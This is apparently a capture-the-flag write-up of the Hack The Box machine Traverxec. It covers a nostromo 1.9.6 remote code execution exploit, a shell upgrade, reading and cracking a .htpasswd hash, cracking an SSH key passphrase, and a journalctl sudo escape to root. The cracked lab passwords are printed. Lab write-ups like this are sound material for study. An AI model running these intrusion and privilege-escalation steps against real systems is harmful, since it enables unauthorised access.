---
title:     "Hack The Box - Traverxec"
tags: [linux,easy,john,sudo]
layout: post
---

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-traverxec/1.png)

We are going to pwn Traverxec by jkr from Hack The Box. Getting User shell is fun and by using GTFOBins correctly we can get Root easily.


Link : <https://www.hackthebox.eu/home/machines/profile/217>


Lets Begin with our Initial Nmap Scan.

## Nmap Scan Results:

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http


22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.18 (90%), Crestron XPanel control system (90%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP:

Looks like an normal webpage and There’s a contact form at the bottom of the page, I send some queries but it’s not doing anything. Also the nmap reveals its ``nostromo 1.9.6``
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-traverxec/2.png)

## Method 1 :

Found an exploit in metasploit 

> https://www.rapid7.com/db/modules/exploit/multi/http/nostromo_code_exec

So Lets fire up the metasploit and try to get the shell
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-traverxec/3.png)

I got ``www--data``

## Method 2 (Without Metasploit)

> https://www.exploit-db.com/exploits/47837

```Usage: cve2019-16278.py <Target_IP> <Target_Port> <Command>```

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-traverxec/19.png)

Once I get into the machine I can't move to anyother dir so I tried to get a proper shell first.
```
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@traverxec:/usr/bin$ cd /var
cd /var
www-data@traverxec:/var$ 
```

While checking ``nostromo`` conf files found that ``.htpasswd`` are located in same dir.<br/>

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-traverxec/5.png)

It gives me user ``david`` hash.<br/>
```
www-data@traverxec:/var/nostromo/conf$ cat /var/nostromo/conf/.htpasswd
cat /var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

And I cracked it with john <br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-traverxec/6.1.png) ``Nowonly4me``<br/>

But I cant ``su david`` with that password. I can't access ``david`` home dir too.<br/>
```
www-data@traverxec:/home$ cd david
cd david
www-data@traverxec:/home/david$ ls
ls
ls: cannot open directory '.': Permission denied
www-data@traverxec:/home/david$ 
```
So I started checking anything else in ``nhttpd.conf`` and noted.

```
# HOMEDIRS [OPTIONAL]

homedirs			/home
homedirs_public		public_www
```

So I googled about ``nhttpd.conf``

>https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=nhttpd

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-traverxec/7.png)

>http://10.10.10.165/~david/

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-traverxec/8.png)<br/>
And that Document tell us that we can view them in the home directory as well as via HTTP.<br/>
We know that ``homedirs_public`` is ``public_www`` So I tried to view them in shell.

```
www-data@traverxec:/var/nostromo/conf$ ls ~david/public_www
ls ~david/public_www
index.html  protected-file-area

www-data@traverxec:/var/nostromo/conf$ ls ~david
ls ~david
ls: cannot open directory '/home/david': Permission denied

www-data@traverxec:/var/nostromo/conf$ ls ~david/public_www
ls ~david/public_www
index.html  protected-file-area

www-data@traverxec:/usr/bin$ ls ~david/public_www/protected-file-area
ls ~david/public_www/protected-file-area
backup-ssh-identity-files.tgz
```
There is Backup-SSH file, Lets download it to our machine using netcat.<br/>

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-traverxec/20.png)

## Another Method to download the SSH backup file:

We know there is ``protected-file-area`` I tried to view them on my webpage.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-traverxec/9.png)
`` david : Nowonly4me `` 

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-traverxec/10.png)

Downloaded that file and extracted on my machine.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-traverxec/11.png)
We got ssh private key.<br/>

It ask for passphase so I tried to crack with ``john`` again. For that we need use ``ssh2john`` first.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-traverxec/12.png)

Now we can use this with ``john``<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-traverxec/13.png) `` : hunter``

Got User Flag<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-traverxec/14.png)

## Privilege Escalation:

There is a script located in the home directory.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-traverxec/15.png)

While checking it , I found that its running ``journalctl`` as sudo.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-traverxec/16.1.png)

>https://gtfobins.github.io/gtfobins/journalctl/

According to this ``journalctl`` we need to shrunk the terminal to two lines and then escaped via less.

So I copied the sudo line <br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-traverxec/16.png)
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-traverxec/17.png)

`` !/bin/sh ``

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-traverxec/18.png)

I'm Root !!






